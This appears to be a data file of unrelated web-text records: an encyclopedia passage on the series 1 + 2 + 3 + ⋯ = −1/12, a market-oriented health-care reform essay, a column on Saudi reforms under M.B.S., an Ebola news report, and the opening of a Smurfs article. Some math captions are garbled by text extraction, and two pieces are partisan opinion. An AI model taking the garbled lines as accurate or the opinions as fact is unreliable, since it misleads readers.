summable. Those methods work on oscillating divergent series, but they cannot produce a finite answer for a series that diverges to +∞.[6] Most of the more elementary definitions of the sum of a divergent series are stable and linear, and any method that is both stable and linear cannot sum 1 + 2 + 3 + ⋯ to a finite value; see below. More advanced methods are required, such as zeta function regularization or Ramanujan summation. It is also possible to argue for the value of − 1/12 using some rough heuristics related to these methods.\n\nHeuristics [ edit ]\n\nPassage from Ramanujan 's first notebook describing the \"constant\" of the series\n\nSrinivasa Ramanujan presented two derivations of \"1 + 2 + 3 + 4 + ⋯ = − 1/12\" in chapter 8 of his first notebook.[7][8][9] The simpler, less rigorous derivation proceeds in two steps, as follows.\n\nThe first key insight is that the series of positive numbers 1 + 2 + 3 + 4 + ⋯ closely resembles the alternating series 1 − 2 + 3 − 4 + ⋯. The latter series is also divergent, but it is much easier to work with; there are several classical methods that assign it a value, which have been explored since the 18th century.[10]\n\nIn order to transform the series 1 + 2 + 3 + 4 + ⋯ into 1 − 2 + 3 − 4 + ⋯, one can subtract 4 from the second term, 8 from the fourth term, 12 from the sixth term, and so on. The total amount to be subtracted is 4 + 8 + 12 + 16 + ⋯, which is 4 times the original series. These relationships can be expressed using algebra. Whatever the \"sum\" of the series might be, call it c = 1 + 2 + 3 + 4 + ⋯. Then multiply this equation by 4 and subtract the second equation from the first:\n\nc = 1 + 2 + 3 + 4 + 5 + 6 + ⋯ 4 c = 4 + 8 + 12 + ⋯ c − 4 c = 1 − 2 + 3 − 4 + 5 − 6 + ⋯ {\\displaystyle {\\begin{alignedat}{7}c&{}={}&1+2&&{}+3+4&&{}+5+6+\\cdots \\\\4c&{}={}&4&&{}+8&&{}+12+\\cdots \\\\c-4c&{}={}&1-2&&{}+3-4&&{}+5-6+\\cdots \\\\\\end{alignedat}}}\n\nThe second key insight is that the alternating series 1 − 2 + 3 − 4 + ⋯ is the formal power series expansion of the function 1/(1 + x)2 but with x defined as 1. Accordingly, Ramanujan writes:\n\n− 3 c = 1 − 2 + 3 − 4 + ⋯ = 1 ( 1 + 1 ) 2 = 1 4 {\\displaystyle -3c=1-2+3-4+\\cdots ={\\frac {1}{(1+1)^{2}}}={\\frac {1}{4}}}\n\nDividing both sides by −3, one gets c = − 1/12.\n\nGenerally speaking, it is incorrect to manipulate infinite series as if they were finite sums. For example, if zeroes are inserted into arbitrary positions of a divergent series, it is possible to arrive at results that are not self-consistent, let alone consistent with other methods. In particular, the step 4c = 0 + 4 + 0 + 8 + ⋯ is not justified by the additive identity law alone. For an extreme example, appending a single zero to the front of the series can lead to inconsistent results.[1]\n\nOne way to remedy this situation, and to constrain the places where zeroes may be inserted, is to keep track of each term in the series by attaching a dependence on some function.[11] In the series 1 + 2 + 3 + 4 + ⋯, each term n is just a number. If the term n is promoted to a function n−s, where s is a complex variable, then one can ensure that only like terms are added. The resulting series may be manipulated in a more rigorous fashion, and the variable s can be set to −1 later. The implementation of this strategy is called zeta function regularization.\n\nZeta function regularization [ edit ]\n\nζ(s). For s > 1 , the series converges and ζ(s) > 1 . Analytic continuation around the pole at s = 1 leads to a region of negative values, including ζ(−1) = − 1 / 12 Plot of). For, the series converges and. Analytic continuation around the pole atleads to a region of negative values, including\n\nIn zeta function regularization, the series ∑ n = 1 ∞ n {\\displaystyle \\sum _{n=1}^{\\infty }n} is replaced by the series ∑ n = 1 ∞ n − s {\\displaystyle \\sum _{n=1}^{\\infty }n^{-s}} . The latter series is an example of a Dirichlet series. When the real part of s is greater than 1, the Dirichlet series converges, and its sum is the Riemann zeta function ζ(s). On the other hand, the Dirichlet series diverges when the real part of s is less than or equal to 1, so, in particular, the series 1 + 2 + 3 + 4 + ⋯ that results from setting s = –1 does not converge. The benefit of introducing the Riemann zeta function is that it can be defined for other values of s by analytic continuation. One can then define the zeta-regularized sum of 1 + 2 + 3 + 4 + ⋯ to be ζ(−1).\n\nFrom this point, there are a few ways to prove that ζ(−1) = − 1/12. One method, along the lines of Euler's reasoning,[12] uses the relationship between the Riemann zeta function and the Dirichlet eta function η(s). The eta function is defined by an alternating Dirichlet series, so this method parallels the earlier heuristics. Where both Dirichlet series converge, one has the identities:\n\nζ ( s ) = 1 − s + 2 − s + 3 − s + 4 − s + 5 − s + 6 − s + ⋯ 2 × 2 − s ζ ( s ) = 2 × 2 − s + 2 × 4 − s + 2 × 6 − s + ⋯ ( 1 − 2 1 − s ) ζ ( s ) = 1 − s − 2 − s + 3 − s − 4 − s + 5 − s − 6 − s + ⋯ = η ( s ) {\\displaystyle {\\begin{alignedat}{7}\\zeta (s)&{}={}&1^{-s}+2^{-s}&&{}+3^{-s}+4^{-s}&&{}+5^{-s}+6^{-s}+\\cdots &\\\\2\\times 2^{-s}\\zeta (s)&{}={}&2\\times 2^{-s}&&{}+2\\times 4^{-s}&&{}+2\\times 6^{-s}+\\cdots &\\\\\\left(1-2^{1-s}\\right)\\zeta (s)&{}={}&1^{-s}-2^{-s}&&{}+3^{-s}-4^{-s}&&{}+5^{-s}-6^{-s}+\\cdots &=\\eta (s)\\\\\\end{alignedat}}}\n\nThe identity ( 1 − 2 1 − s ) ζ ( s ) = η ( s ) {\\displaystyle (1-2^{1-s})\\zeta (s)=\\eta (s)} continues to hold when both functions are extended by analytic continuation to include values of s for which the above series diverge. Substituting s = −1, one gets −3ζ(−1) = η(−1). Now, computing η(−1) is an easier task, as the eta function is equal to the Abel sum of its defining series,[13] which is a one-sided limit:\n\n− 3 ζ ( − 1 ) = η ( − 1 ) = lim x → 1 − ( 1 − 2 x + 3 x 2 − 4 x 3 + ⋯ ) = lim x → 1 − 1 ( 1 + x ) 2 = 1 4 {\\displaystyle -3\\zeta (-1)=\\eta (-1)=\\lim _{x\\to 1^{-}}\\left(1-2x+3x^{2}-4x^{3}+\\cdots \\right)=\\lim _{x\\to 1^{-}}{\\frac {1}{(1+x)^{2}}}={\\frac {1}{4}}}\n\nDividing both sides by −3, one gets ζ(−1) = − 1/12.\n\nCutoff regularization [ edit ]\n\nThe series 1 + 2 + 3 + 4 + ⋯ After smoothing\n\ny-intercept of the parabola is − 1 / 12 .[1] Asymptotic behavior of the smoothing. The-intercept of the parabola is\n\nThe method of regularization using a cutoff function can \"smooth\" the series to arrive at − 1/12. Smoothing is a conceptual bridge between zeta function regularization, with its reliance on complex analysis, and Ramanujan summation, with its shortcut to the Euler–Maclaurin formula. Instead, the method operates directly on conservative transformations of the series, using methods from real analysis.\n\nThe idea is to replace the ill-behaved discrete series ∑ n = 0 N n {\\displaystyle \\sum _{n=0}^{N}n} with a smoothed version\n\n∑ n = 0 ∞ n f ( n N ) {\\displaystyle \\sum _{n=0}^{\\infty }nf\\left({\\frac {n}{N}}\\right)}\n\nwhere f is a cutoff function with appropriate properties. The cutoff function must be normalized to f(0) = 1; this is a different normalization from the one used in differential equations. The cutoff function should have enough bounded derivatives to smooth out the wrinkles in the series, and it should decay to 0 faster than the series grows. For convenience, one may require that f is smooth, bounded, and compactly supported. One can then prove that this smoothed sum is asymptotic to − 1/12 + CN2, where C is a constant that depends on f. The constant term of the asymptotic expansion does not depend on f: it is necessarily the same value given by analytic continuation, − 1/12.[1]\n\nRamanujan summation [ edit ]\n\nThe Ramanujan sum of 1 + 2 + 3 + 4 + ⋯ is also − 1/12. Ramanujan wrote in his second letter to G. H. Hardy, dated 27 February 1913:\n\n\"Dear Sir, I am very much gratified on perusing your letter of the 8th February 1913. I was expecting a reply from you similar to the one which a Mathematics Professor at London wrote asking me to study carefully Bromwich's Infinite Series and not fall into the pitfalls of divergent series. … I told him that the sum of an infinite number of terms of the series: 1 + 2 + 3 + 4 + ⋯ = − 1 / 12 under my theory. If I tell you this you will at once point out to me the lunatic asylum as my goal. I dilate on this simply to convince you that you will not be able to follow my methods of proof if I indicate the lines on which I proceed in a single letter. …\"[14]\n\nRamanujan summation is a method to isolate the constant term in the Euler–Maclaurin formula for the partial sums of a series. For a function f, the classical Ramanujan sum of the series ∑ k = 1 ∞ f ( k ) {\\displaystyle \\sum _{k=1}^{\\infty }f(k)} is defined as\n\nc = − 1 2 f ( 0 ) − ∑ k = 1 ∞ B 2 k ( 2 k ) ! f ( 2 k − 1 ) ( 0 ) , {\\displaystyle c=-{\\frac {1}{2}}f(0)-\\sum _{k=1}^{\\infty }{\\frac {B_{2k}}{(2k)!}}f^{(2k-1)}(0),}\n\nwhere f(2k−1) is the (2k − 1)-th derivative of f and B 2k is the 2kth Bernoulli number: B 2 = 1/6, B 4 = − 1/30, and so on. Setting f(x) = x, the first derivative of f is 1, and every other term vanishes, so:[15]\n\nc = − 1 6 × 1 2 ! = − 1 12 . {\\displaystyle c=-{\\frac {1}{6}}\\times {\\frac {1}{2!}}=-{\\frac {1}{12}}.}\n\nTo avoid inconsistencies, the modern theory of Ramanujan summation requires that f is \"regular\" in the sense that the higher-order derivatives of f decay quickly enough for the remainder terms in the Euler–Maclaurin formula to tend to 0. Ramanujan tacitly assumed this property.[15] The regularity requirement prevents the use of Ramanujan summation upon spaced-out series like 0 + 2 + 0 + 4 + ⋯, because no regular function takes those values. Instead, such a series must be interpreted by zeta function regularization. For this reason, Hardy recommends \"great caution\" when applying the Ramanujan sums of known series to find the sums of related series.[16]\n\nFailure of stable linear summation methods [ edit ]\n\nA summation method that is linear and stable cannot sum the series 1 + 2 + 3 + ⋯ to any finite value. (Stable means that adding a term to the beginning of the series increases the sum by the same amount.) This can be seen as follows. If\n\n1 + 2 + 3 + ⋯ = x\n\nthen adding 0 to both sides gives\n\n0 + 1 + 2 + ⋯ = 0 + x = x by stability.\n\nBy linearity, one may subtract the second equation from the first (subtracting each component of the second line from the first line in columns) to give\n\nAdding 0 to both sides again gives\n\n0 + 1 + 1 + 1 + ⋯ = 0,\n\nand subtracting the last two series gives\n\n1 + 0 + 0 + ⋯ = 0\n\ncontradicting stability.\n\nTherefore, every method that gives a finite value to the sum 1 + 2 + 3 + ⋯ is not stable or not linear.[17]\n\nPhysics [ edit ]\n\nIn bosonic string theory, the attempt is to compute the possible energy levels of a string, in particular the lowest energy level. Speaking informally, each harmonic of the string can be viewed as a collection of D − 2 independent quantum harmonic oscillators, one for each transverse direction, where D is the dimension of spacetime. If the fundamental oscillation frequency is ω then the energy in an oscillator contributing to the nth harmonic is nħω/2. So using the divergent series, the sum over all harmonics is − ħω(D − 2)/24. Ultimately it is this fact, combined with the Goddard–Thorn theorem, which leads to bosonic string theory failing to be consistent in dimensions other than 26.[18]\n\nThe regularization of 1 + 2 + 3 + 4 + ⋯ is also involved in computing the Casimir force for a scalar field in one dimension.[19] An exponential cutoff function suffices to smooth the series, representing the fact that arbitrarily high-energy modes are not blocked by the conducting plates. The spatial symmetry of the problem is responsible for canceling the quadratic term of the expansion. All that is left is the constant term − 1/12, and the negative sign of this result reflects the fact that the Casimir force is attractive.[20]\n\nA similar calculation is involved in three dimensions, using the Epstein zeta-function in place of the Riemann zeta function.[21]\n\nHistory [ edit ]\n\nIt is unclear whether Leonhard Euler summed the series to − 1/12. According to Morris Kline, Euler's early work on divergent series relied on function expansions, from which he concluded 1 + 2 + 3 + 4 + ⋯ = ∞.[22] According to Raymond Ayoub, the fact that the divergent zeta series is not Abel summable prevented Euler from using the zeta function as freely as the eta function, and he \"could not have attached a meaning\" to the series.[23] Other authors have credited Euler with the sum, suggesting that Euler would have extended the relationship between the zeta and eta functions to negative integers.[24][25][26] In the primary literature, the series 1 + 2 + 3 + 4 + ⋯ is mentioned in Euler's 1760 publication De seriebus divergentibus alongside the divergent geometric series 1 + 2 + 4 + 8 + ⋯. Euler hints that series of this type have finite, negative sums, and he explains what this means for geometric series, but he does not return to discuss 1 + 2 + 3 + 4 + ⋯. In the same publication, Euler writes that the sum of 1 + 1 + 1 + 1 + ⋯ is infinite.[27]\n\nIn popular media [ edit ]\n\nDavid Leavitt's 2007 novel The Indian Clerk includes a scene where Hardy and Littlewood discuss the meaning of this series. They conclude that Ramanujan has rediscovered ζ(−1), and they take the \"lunatic asylum\" line in his second letter as a sign that Ramanujan is toying with them.[28]\n\nSimon McBurney's 2007 play A Disappearing Number focuses on the series in the opening scene. The main character, Ruth, walks into a lecture hall and introduces the idea of a divergent series before proclaiming, \"I'm going to show you something really thrilling,\" namely 1 + 2 + 3 + 4 + ⋯ = − 1/12. As Ruth launches into a derivation of the functional equation of the zeta function, another actor addresses the audience, admitting that they are actors: \"But the mathematics is real. It's terrifying, but it's real.\"[29][30]\n\nIn January 2014, Numberphile produced a YouTube video on the series, which gathered over 1.5 million views in its first month.[31] The 8-minute video is narrated by Tony Padilla, a physicist at the University of Nottingham. Padilla begins with 1 − 1 + 1 − 1 + ⋯ and 1 − 2 + 3 − 4 + ⋯ and relates the latter to 1 + 2 + 3 + 4 + ⋯ using a term-by-term subtraction similar to Ramanujan's argument.[32] Numberphile also released a 21-minute version of the video featuring Nottingham physicist Ed Copeland, who describes in more detail how 1 − 2 + 3 − 4 + ⋯ = 1/4 as an Abel sum and 1 + 2 + 3 + 4 + ⋯ = − 1/12 as ζ(−1).[33] After receiving complaints about the lack of rigour in the first video, Padilla also wrote an explanation on his webpage relating the manipulations in the video to identities between the analytic continuations of the relevant Dirichlet series.[34]\n\nIn The New York Times coverage of the Numberphile video, mathematician Edward Frenkel commented, \"This calculation is one of the best-kept secrets in math. No one on the outside knows about it.\"[31]\n\nCoverage of this topic in Smithsonian magazine describes the Numberphile video as misleading, and notes that the interpretation of the sum as − 1/12 relies on a specialized meaning for the equals sign, from the techniques of analytic continuation, in which equals means is associated with.[35]\n\nNotes [ edit ]\n\nReferences [ edit ]\n\nFurther reading [ edit ]",

Yet decades of legislative attempts have failed to achieve this aim.\n\nWhy? First, proposed and enacted reforms have tended to focus on the provision of services rather than on the outcomes of those services.\n\nSecond, reforms have tended to reinforce the weaknesses of the current system. Existing laws, regulations, institutions, and politics obstruct and discourage cost-cutting innovation. They unnecessarily constrain the supply of care, the means to improve it, and the capacity to lower costs. These problems predate the Affordable Care Act (ACA), but the ACA compounds them. Unfortunately, proponents of market-based solutions have mostly offered piecemeal fixes that have failed to convince broader constituencies.\n\nThird, Washington has aimed far too low. We should not seek to “bend the cost curve,” but rather to break it to bits. Enabling more people to receive better care at lower cost on a continuous basis requires replicating the plunging costs and soaring quality in computing, transportation, agriculture, manufacturing, distribution, and communication. In the mid-1990s, simple cell phones were toys of the rich; 15 years later, smartphones dotted the world’s poorest villages. When American health care boasts the cost-cutting innovation we associate with a Steve Jobs or Henry Ford, we’ll be on the right track.\n\nPRINCIPLES OF SUCCESSFUL HEALTH CARE REFORM\n\nAchieving a successful health care system rests on the following principles:\n\nCost-cutting innovation is achievable. In recent times, health care technology’s miraculous leaps have been accompanied by dramatic cost increases. But this pattern is established by current laws, regulations, and institutions. Nothing intrinsic to health care dooms us to perpetually rising costs or, eventually, to centrally planned rationing.\n\nConsumers (patients) are paramount. The health care system often protects established providers to the detriment of consumers. Federal and state laws should enable competitors to challenge established providers, thus making the interests of consumers paramount.\n\nProviders need autonomy. Physicians, hospitals, and other providers face rigid government controls and red tape. Innovation cannot flourish in a system focused on stabilizing the status and livelihoods of well-established producers. Providers must have sufficient autonomy to focus on consumers’ wishes.\n\nInnovators need rewards. Current health care laws and regulations discourage or prohibit cost-cutting, quality-improving innovation. Markets must reward innovators who provide services that consumers value, and these innovators must not face arbitrary punishment for taking reasonable risks.\n\nConsumers need choices. Since World War II, laws have arbitrarily separated Americans into rigidly segmented insurance markets—Medicare, Medicaid, CHIP, VA, ERISA, small-group, large-group, individual, high-risk. A unitary market would yield greater competition and more informed consumers.\n\nMarkets need prices. In the current system, prices bear little relation to underlying costs or consumers’ preferences. So, neither consumers nor providers have adequate information to allocate resources efficiently. Innovation and efficiency require strong, reliable, and transparent price signals.\n\nFinances must be stable and equitable. Medicare currently requires huge intergenerational wealth transfers to stay afloat, yet it still teeters on the edge of insolvency. The ACA will greatly expand these transfers. These laws demand that younger, healthier Americans overpay for insurance so that older, sicker (and often wealthier) Americans can underpay. Programs must be structured to assure long-term viability and must not impoverish the young to pay for the old.\n\nHealth insurance does not equal health care. It is important to remember that health insurance does not ensure health care. And health care is only one determinant of health. Ultimately, we must evaluate success on how healthy people are and not on how many procedures we do on them.\n\nPUTTING PRINCIPLES INTO PRACTICE\n\nThe health-care system cannot adequately serve consumers and patients without cost-cutting (aka “disruptive”) innovation that sends costs plummeting and quality of service rising. Disruptive innovation requires three conditions: 1) innovators must be allowed to innovate; 2) consumers must have choices; and 3) price and quality information must flow freely among consumers and producers.\n\nEnable innovators. Disruptive innovation occurs when new entrants can challenge established producers on a level playing field. The government must not protect insiders from competitors, and all producers must be free to innovate, experiment, and take prudent risks. Reforms that enable innovators will:\n\nEliminate state laws protecting established providers against competition. At present, certificate of need requirements block new hospitals from entering the market. Aggressive scope-of-practice limitations bar nurse practitioners, pharmacists, and others from undercutting physicians. State licensing requirements block entry by out-of-state newcomers. Hospital funding schemes protect established institutions from competitors. Benefit and provider mandates force consumers to purchase undesired coverage. State medical education policies can artificially limit the supply of providers.\n\nRationalize the tort system so malpractice laws punish those who are guilty of malpractice and don’t punish those who are innocent. The vast majority of malpractice incidents never reach trial or settlement. And evidence suggests that only a minority of doctors paying malpractice judgments or settlements are actually guilty of malpractice. The tort system’s real damage may be that the threat of malpractice litigation stifles innovative treatments and delivery systems.\n\nAllow consumers and producers to tap foreign innovations. Domestic insurers should be able to cover visits to overseas facilities. American hospitals should be free to adopt successful management techniques from abroad. Hospitals in places like India, Costa Rica, and Thailand have developed remarkable delivery systems. Places like Singapore and Japan offer innovative insurance models.\n\nReduce red tape and excessive restriction of practice patterns. Regulations create artificial economies of scale, making it difficult for physicians and others to operate small practices. Larger practices may be more risk-averse and, hence, less conducive to innovation.\n\nGive consumers choices. For innovation to take root, informed consumers must be able to accept and reject options put forward by the market. Our current, fragmented insurance system deprives consumers of options and makes it difficult for them to vote with their feet. Successful reforms will:\n\nMove toward a seamless market. The fragmentation of the insurance market makes it impossible for neighbors, friends, and colleagues to share information in ways that enable competitive markets to function. Reduce the number of submarkets and separate government programs, and increase the mobility and portability among different insurance plans.\n\nRemove the tax-code bias that favors employer-based coverage over individual coverage. This is particularly important in moving to a seamless market. The current bias toward employer-sponsored insurance is a legacy of World War II–era price controls, compounded by taxation practices and labor regulation.\n\nBegin moving Medicaid enrollees into the private health insurance market. This, too, is a crucial part of establishing a seamless market, and it is also an ethical issue. Medicaid consigns lower-income Americans to substandard care and deprives them of choices. As enrollees’ income fluctuates, they can churn back and forth between Medicaid and private insurance—sometimes sending family members into different markets and interrupting care. Block grants are an appealing half-way measure, but ideally, today’s Medicaid enrollees ought to have access to the same coverage that wealthier Americans purchase—with financial assistance where needed.\n\nAllow standard insurance to accommodate people with pre-existing medical conditions. The ACA takes a heavy-handed approach by simply requiring insurers to accept all comers, regardless of their health status—an approach that previously wrecked the insurance systems in several states (notably New York and Kentucky). Better methods are available. High-risk pools are one possibility, but they are arguably a single-payer system for the sick. Alternatives include premium supports (subsidies) for purchasing standard policies and health-status-change insurance.\n\nCreate a legal environment conducive to long-term health-insurance contracts. One can buy a life insurance or long-term care policy that specifies a schedule of premiums to pay over the next, say, 20 years, along with a promised payout schedule. Not so with health insurance. One reason is that what we call health insurance is hybrid health insurance plus a health care prepayment plan. Another reason is that insurers know that government may slap additional benefit mandates on the policies in future years, thus making it impossible to estimate future costs.\n\nStrengthen information flows. Innovation requires informed, empowered consumers. Decisions should be made by patients, their families, and their medical providers. It is less desirable for these decisions to be imposed by, say, state officials, and even less so by distant federal officials in Washington. Contrary to elite opinion, patients and other laypeople are quite adept at making complex health care decisions. Furthermore, patients’ medical decisions often depend on subjective and highly personal preferences, not on objective scientific criteria. Successful reforms will:\n\nReplace Medicare’s reimbursement formula so prices reflect both the underlying costs and the preferences of consumers/patients. Medicare’s reimbursement formula—based on a set of rigid price controls—severs the connections between prices and underlying costs, thereby misallocating resources. (The misallocation is worsened by the fact that the reimbursement rates for a particular specialty depend not on the interaction of supply and demand, but rather on the specialty’s self-evaluation.) Medicare’s formula drives prices and insurance contracts outside of Medicare. And poor administrative oversight of Medicare providers leads to staggering levels of waste and fraud. Medicare’s pathologies comprise the single greatest challenge to America’s fiscal stability and the single greatest obstacle to health care innovation.\n\nMake health care prices meaningful and transparent. Health care “prices” are largely accounting fictions that bear scant relationship to the underlying supply costs or patient preferences. To change this, the Medicare reimbursement formula must be addressed and, along with it, the largely derivative private insurance and hospital prices. Only when patients and providers can see and feel the impact of costs—reflected in prices—will we begin moving toward efficient resource allocation.\n\nMinimize the reliance on centralized experts. The ACA greatly expands the role of self-designated experts to determine which treatments people receive, when they receive them, and at what cost. This drives health care further away from patients’ desires and toward the preferences of a distant elite. Centralized allocation requires an excessive faith in data, modeling, the peer-review process, the permanence of scientific findings, the omniscience and impartiality of bureaucrats and politicians, and the power of centralized decision-makers to fine-tune the behavior of more than 300 million Americans. Innovation requires a healthy respect for science and strong doses of skepticism and humility.\n\nAllow Americans to purchase true health insurance. What currently passes for health insurance is part insurance but mostly a prepayment plan for health care services. This generates vast administrative costs for routine procedures and absolves consumers and providers of any need to consider the relative costs and benefits of treatments. The ACA worsens the problem by discouraging high-deductible plans, health savings accounts, and other elements of consumer choice.\n\nDon’t imperil economic opportunity. The current structure and financing of health insurance diminish individuals’ life prospects by interfering with their access to employment and with their ability to save and accumulate wealth. Furthermore, the effects of employer-based health insurance on employment and wealth fall inequitably and arbitrarily on different groups.",
  "latent_26113": "So many of these reforms were so long overdue it’s ridiculous. Better late than never, though.\n\nOn foreign policy, M.B.S. would not discuss the strange goings on with Prime Minister Saad Hariri of Lebanon coming to Saudi Arabia and announcing his resignation, seemingly under Saudi pressure, and now returning to Beirut and rescinding that resignation. He simply insisted that the bottom line of the whole affair is that Hariri, a Sunni Muslim, is not going to continue providing political cover for a Lebanese government that is essentially controlled by the Lebanese Shiite Hezbollah militia, which is essentially controlled by Tehran.\n\nHe insisted that the Saudi-backed war in Yemen, which has been a humanitarian nightmare, was tilting in the direction of the pro-Saudi legitimate government there, which, he said is now in control of 85 percent of the country, but given the fact that pro-Iranian Houthi rebels, who hold the rest, launched a missile at Riyadh airport, anything less than 100 percent is still problematic.\n\nHis general view seemed to be that with the backing of the Trump administration — he praised President Trump as “the right person at the right time” — the Saudis and their Arab allies were slowly building a coalition to stand up to Iran. I am skeptical. The dysfunction and rivalries within the Sunni Arab world generally have prevented forming a unified front up to now, which is why Iran indirectly controls four Arab capitals today — Damascus, Sana, Baghdad and Beirut. That Iranian over-reach is one reason M.B.S. was scathing about Iran’s supreme leader, Ayatollah Ali Khamenei.\n\nIran’s “supreme leader is the new Hitler of the Middle East,” said M.B.S. “But we learned from Europe that appeasement doesn’t work. We don’t want the new Hitler in Iran to repeat what happened in Europe in the Middle East.” What matters most, though, is what Saudi Arabia does at home to build its strength and economy.\n\nBut can M.B.S. and his team see this through? Again, I make no predictions. He has his flaws that he will have to control, insiders here tell me. They include relying on a very tight circle of advisers who don’t always challenge him sufficiently, and a tendency to start too many things that don’t get finished. There’s a whole list. But guess what? Perfect is not on the menu here. Someone had to do this job — wrench Saudi Arabia into the 21st century — and M.B.S. stepped up. I, for one, am rooting for him to succeed in his reform efforts.\n\nAnd so are a lot of young Saudis. There was something a 30-year-old Saudi woman social entrepreneur said to me that stuck in my ear. “We are privileged to be the generation that has seen the before and the after.” The previous generation of Saudi women, she explained, could never imagine a day when a woman could drive and the coming generation will never be able to imagine a day when a woman couldn’t.\n\n“But I will always remember not being able to drive,” she told me. And the fact that starting in June that will never again be so “gives me so much hope. It proves to me that anything is possible — that this is a time of opportunity. We have seen things change and we are young enough to make the transition.”",

The New England Journal of Medicine\n\n“Before this outbreak, scientists believed that Ebola virus could be found in semen for three months after recovery,” said Dr. Moses Soka of the Liberian Ministry of Health, who helped conduct the study.\n\n“With this study, we now know that virus may persist for a year or longer.”\n\nBefore the West African epidemic, Ebola had only caused isolated, small outbreaks of at most a few hundred people. There was not much hint the virus stayed in the bodies of survivors.\n\n“With this study, we now know that virus may persist for a year or longer.”\n\nThis epidemic infected more than 28,000 people before it came under control. Fresh outbreaks – the latest one just this March – have been traced to sexual transmission from male survivors.\n\n“We had, in March, an outbreak in Guinea,” Centers for Disease and Control director Dr. Thomas Frieden told reporters Tuesday.\n\nRelated: Health Workers Fight Fresh Ebola Outbreak in Guinea\n\nIt was traced to a man who’d recovered more than 15 months before from Ebola. He infected a woman sexually. Thirteen people became infected and nine of them died, Frieden said.\n\n“We have now seen very long persistence in semen, which means we’ll see a risk of cases for years to come,” he said.\n\nFrieden said it’s important to keep studying Ebola and keep up the defenses against it.\n\n“We don’t want to see this come roaring back after all the hard work and after all the lives that have been lost,” he said.\n\nThe CDC is among the agencies working to help Liberia, Guinea, Sierra Leone and other countries build up their public health systems so they can catch Ebola and other diseases as soon as they break out, before they spread.\n\n“We don’t want to see this come roaring back after all the hard work and after all the lives that have been lost.\"\n\nThe team working in Liberia studied 429 men who survived Ebola infection. They found that 9 percent of the men had pieces of Ebola virus in their semen.\n\n“Of those, 63 percent had semen samples that tested positive for Ebola fragments a year after recovering from disease and, in one man’s case, at least 565 days after he recovered from illness,” the CDC said in a statement.\n\nMen over the age of 40 were more likely than younger men to have Ebola in their semen, the team reported in the journal Lancet Global Health.\n\nRelated: Ebola Survivors Suffer Long-Term Consequences\n\nIn one man, the virus could be found 565 days after he recovered.\n\n\"We now have many more Ebola survivors than ever before,” Soka said.\n\n“This work demonstrates the importance of providing laboratory testing and behavioral counseling to empower survivors to make informed decisions to protect their intimate partners.”\n\nU.S. agencies are helping test a drug called GS-5734 to see if it can clear the virus from men’s semen.\n\nIt’s made by Gilead Sciences, which specializes in antiviral drugs. It's protected animals against Ebola and has been safe in early tests in people.\n\nThe World Health Organization advises Ebola survivors to abstain from sex for three months or use a condom. Ebola spreads through bodily fluids — vomit and diarrhea, blood and even sweat. Infection requires close, sustained contact, however, and caregivers are most at risk, as are the people who prepare the bodies of people killed by Ebola.\n\nBut the virus can linger in parts of the body that are called immune privileged sites. These include semen but also the eyes, spinal cord and elsewhere. Scottish nurse Pauline Cafferkey is one example. She got infected while helping fight the Ebola epidemic in West Africa. She was taken back to the hospital at least twice when the virus began replicating in her spinal fluid, causing symptoms.",

  "latent_26371": "This article is about the franchise. For other uses, see Smurf (disambiguation)\n\nThe Smurfs (French: Les Schtroumpfs; Dutch: De Smurfen) is a Belgian comic franchise centered on a fictional colony of small, blue, human-like creatures who live in mushroom-shaped houses in the forest. The Smurfs was first created and introduced as a series of comic characters by the Belgian comics artist Peyo (the pen name of Pierre Culliford) in 1958, wherein they were known as Les Schtroumpfs. There are more than 100 Smurf characters, and their names are based on adjectives that emphasise their characteristics, such as \"Jokey Smurf\", who likes to play practical jokes on his fellow smurfs. \"Smurfette\" was the first female Smurf to be introduced in the series. The Smurfs wear Phrygian caps, which came to represent freedom during the modern era.\n\nThe word “smurf” is the original Dutch translation of the French \"schtroumpf\", which, according to Peyo, is a word he invented during a meal with fellow cartoonist André Franquin when he could not remember the word salt.[1][2][3]\n\nThe Smurfs franchise began as a comic and expanded into advertising, films, TV series, ice capades, video games, theme parks, and dolls.\n\nOrigin\n\nAt the time he came up with the idea for the Smurfs, Peyo was the creator, artist, and writer of the Franco-Belgian comics series titled Johan et Pirlouit (translated to English as Johan and Peewit), set in Europe during the Middle Ages and including elements of sword-and-sorcery. Johan serves as a brave young page to the king, and Pirlouit (pronounced Peer-loo-ee) functions as his faithful, if boastful and cheating, midget sidekick. In 1958, Spirou magazine started to publish the Johan et Pirlouit story La Flûte à six trous (\"The Flute with Six Holes\").[4] The adventure involved them recovering a magic flute, which required some sorcery by the wizard Homnibus. In this manner, they met a tiny, blue-skinned humanoid in white clothing called a \"Schtroumpf\", followed by his numerous peers who looked just like him, with an elderly leader who wore red clothing and had a white beard. Their first full appearance was published in Spirou on October 23, 1958.[5] The characters proved to be a huge success, and the first independent Smurf stories appeared in Spirou in 1959, together with the first merchandising. The Smurfs shared more adventures with Johan and Pirlouit, got their own series and all subsequent publications of the original story were retitled La Flûte à six Schtroumpfs (also the title of the movie version of the story).\n\nWith the commercial success of the Smurfs came the merchandising empire of Smurf miniatures, models, games, and toys. Entire collecting clubs have devoted themselves to collecting PVC Smurfs and Smurf merchandise.\n\nName\n\nSchtroumpf is pronounced like the German word \"Strumpf\" meaning \"sock\". However, according to Peyo, the original author of the Smurfs comic strip, the term and the accompanying language of the Smurfs came during a meal he had with his colleague and friend André Franquin at the Belgian Coast. Having momentarily forgotten the word \"salt\", Peyo asked him (in French) to pass the schtroumpf. Franquin jokingly replied, \"Here's the Schtroumpf—when you are done schtroumpfing, schtroumpf it back...\" and the two spent the rest of that weekend speaking in \"schtroumpf language\".[1][3] The name was later translated into Dutch as Smurf, which was adopted in English.[2]\n\nBoth the comics and cartoons have been translated in many languages. In most cases, the original name \"Schtroumpf\" is replaced by a new term. The most common are variations on the Dutch translation \"Smurf\", while other names are indicative of their gnome-like appearance.\n\nIn Spanish, they are called \"Pitufos\", a term invented by Miguel Agustí who was the head of the Spanish magazine Strong which first published the cartoon in Spanish. According to Agustí, he was walking around Barcelona while trying to come up a name for the cartoon. He came across a sculpture of the Ox of Patufet and was inspired by the word Patufet. From Patufet he derived the non-existent word Pitufo. The name later spread to most Spanish-language versions of the cartoon. [6]\n\nSmurfs universe\n\nSmurfs\n\nThe storylines tend to be simple tales of bold adventure. The cast has a simple structure as well: almost all the characters look essentially alike—mostly male (a few female Smurfs have appeared: Smurfette, Sassette, and Nanny Smurf), short (three apples high),[7] with blue skin, white trousers with a hole for their short tails, white hat in the style of a Phrygian cap, and sometimes some additional accessory that identifies a personality (for example, \"Handy Smurf\" wears overalls instead of the standard trousers, a brimmed hat, and a pencil above his ear). Smurfs can walk and run, but often move by skipping 